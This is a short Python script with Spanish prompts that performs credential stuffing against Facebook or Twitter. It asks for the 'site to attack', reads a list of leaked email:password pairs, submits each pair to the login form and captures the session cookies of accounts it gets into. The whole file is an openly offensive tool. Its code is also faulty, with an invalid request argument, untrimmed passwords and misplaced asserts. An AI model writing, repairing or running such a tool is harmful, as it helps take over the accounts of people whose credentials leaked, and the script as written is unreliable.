import requests
 
fb = 'facebook'
tt = 'twitter'
 
print('\n===========================================\n')
print(fb, tt)
print('\n===========================================\n')
sit = input("Dominio del sitio a atacar: " )
print('\n===========================================\n')
log = input("Tipo del login del dominio/login.html: ")
print('\n===========================================\n')
 
# Redes Y Lugares Donde Probar
if sit == fb:
    sit = 'https://www.facebook.com'
    if log == '':
        log = '/login.php'
    TE = 'email'
    TP = 'pass'
elif sit == tt:
    sit = 'https://www.twitter.com'
    if log == '':
        log = '/login.html'
 
    # TE, TP es el nombre del recuadro username y password
 
    TE = 'session[username_or_email]'
    TP = 'session[password]'
sit = sit+log
 
def login(session, email, password):
    response = session.post(sit, data={
        TE: email,
        TP: password
    }, allow_redirects=False)
    assert response.status_code == 302
    assert 'c_user' in response.cookies
    return response.cookies
 
with open("Lista De Correos Y Contraseñas") as f:
    for line in f:
        correos, pwd = line.split(':')
 
        # Aqui las contraseñas estan unidas por un ':'
        # Por eso el split
 
        session = requests.session()
        cookies = login(session, correos, pwd)
        response = session.get(sit, cookies=cookies,
         _allow_redirects = False)
    assert response.text.find('Home') != -1